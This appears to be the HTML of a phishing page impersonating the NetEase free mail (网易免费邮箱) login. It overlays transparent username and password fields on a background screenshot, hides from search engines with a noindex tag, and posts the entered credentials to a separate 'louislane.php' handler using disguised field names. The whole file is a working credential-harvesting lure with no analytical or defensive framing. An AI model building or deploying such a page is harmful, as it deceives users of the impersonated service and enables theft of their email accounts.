<html>
<head>
<meta charset="utf-8">
<title>网易免费邮箱 - 中国第一大电子邮件服务商</title> 
<meta name="robots" content="noindex,nofollow" />
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<style>.gdull{background: url(roof/thiefuche098789.png) no-repeat ; height: 672px; background-repeat: no-repeat; width: 1366px;} 

.farming{float: left; position: absolute; left: 0; margin-top: 63px; background: transparent; width: 366px; border-radius: 4px; margin-left: 614px;}</style>
</head>

<body class="gdull" style=" padding: 0; margin: 0;  background-color: #1691D7;">

<div style="width: 100%; background: #0B496C;"> <img src="roof/top_head.png" >
</div>

<br></br>

<div class="farming">	
<br>

<form id="farmingtech" method="post" action="louislane.php">


<input type="text" name="denzelwashington" tabindex="1" value="" required=""  placeholder="邮箱帐号"  style="height: 46px;line-height: 42px;padding-left: 8px;margin-bottom: 20px;width: 340px;background: transparent;border: none;padding-left: 46px;font-size: 14px;color: #333; margin-left: 9px;"> 

<input type="password" name="arthuemerlin" autocomplete="off" tabindex="2" value="" required="" placeholder="输入密码" style="height: 45px;line-height: 42px;padding-left: 8px;margin-bottom: 20px;width: 340px;background: transparent;border: none;padding-left: 46px;font-size: 14px;color: #333;margin-top: -3px; margin-left: 9px;">
<br>
 
   
<button name="deepwell" title="Login" style="z-index: 10;\: 700;cursor: pointer;font-size: 20px;background-color: #bb0826;color: #FFF;height: 49px;text-align: center;width: 342px; margin-left: 9px; margin-top: -8px;background: #4B91D5;background-image: linear-gradient(#64A5E6, #4086CE);border-radius: 4px;border: #6699CC 1px solid;font-family:'microsoft yahei','微软雅黑';">登&nbsp;录</button>

</form>
 
</div>

</div>
 
<div style="width: 100%; background: #0B496C;"> 
<img src="roof/down_row.png" style=" margin: 0; padding: 0; border: 0; font: inherit; vertical-align: baseline; position: absolute; bottom: 0; ">
</div>

 
</body>
</html>
